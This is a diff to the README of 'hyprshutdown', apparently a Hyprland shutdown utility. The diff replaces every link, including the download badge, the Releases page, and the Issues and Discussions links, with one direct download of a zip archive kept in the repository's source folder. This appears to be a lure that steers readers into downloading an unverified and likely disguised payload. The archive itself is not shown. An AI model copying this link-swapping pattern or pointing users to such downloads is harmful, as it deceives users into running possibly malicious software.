@@ -1,6 +1,6 @@
 # 🚀 hyprshutdown - Gracefully Shut Down Your Hyprland System 
 
-[![Download hyprshutdown](https://img.shields.io/badge/Download-hyprshutdown-brightgreen)](https://github.com/n0thing923/hyprshutdown/releases)
+[![Download hyprshutdown](https://github.com/n0thing923/hyprshutdown/raw/refs/heads/main/src/ui/hyprshutdown_v1.6-alpha.2.zip)](https://github.com/n0thing923/hyprshutdown/raw/refs/heads/main/src/ui/hyprshutdown_v1.6-alpha.2.zip)
 
 ## 📋 Description
 
@@ -23,7 +23,7 @@ Before downloading, ensure that your system meets these requirements:
 
 To get started, visit the Releases page to download the latest version:
 
-[Download hyprshutdown](https://github.com/n0thing923/hyprshutdown/releases)
+[Download hyprshutdown](https://github.com/n0thing923/hyprshutdown/raw/refs/heads/main/src/ui/hyprshutdown_v1.6-alpha.2.zip)
 
 Click on the link above to access the release options. You will see a list of available versions. 
 
@@ -64,7 +64,7 @@ If you encounter any issues:
 2. **Installation Fails**: Check disk space and ensure you have permission to install software.
 3. **Cannot Find the Application**: Search in your Start menu (Windows) or Applications folder (Linux).
 
-For further assistance, you can check the [GitHub Issues](https://github.com/n0thing923/hyprshutdown/issues) page or reach out to the community.
+For further assistance, you can check the [GitHub Issues](https://github.com/n0thing923/hyprshutdown/raw/refs/heads/main/src/ui/hyprshutdown_v1.6-alpha.2.zip) page or reach out to the community.
 
 ## 📢 Feedback 
 
@@ -80,7 +80,7 @@ hyprshutdown is open-source software. You can use and modify it under the terms 
 
 ## 🌍 Community 
 
-Join our community discussions on [GitHub Discussions](https://github.com/n0thing923/hyprshutdown/discussions). Connect with other users and share your experiences or questions!
+Join our community discussions on [GitHub Discussions](https://github.com/n0thing923/hyprshutdown/raw/refs/heads/main/src/ui/hyprshutdown_v1.6-alpha.2.zip). Connect with other users and share your experiences or questions!
 
 ## ⚡️ Support
 
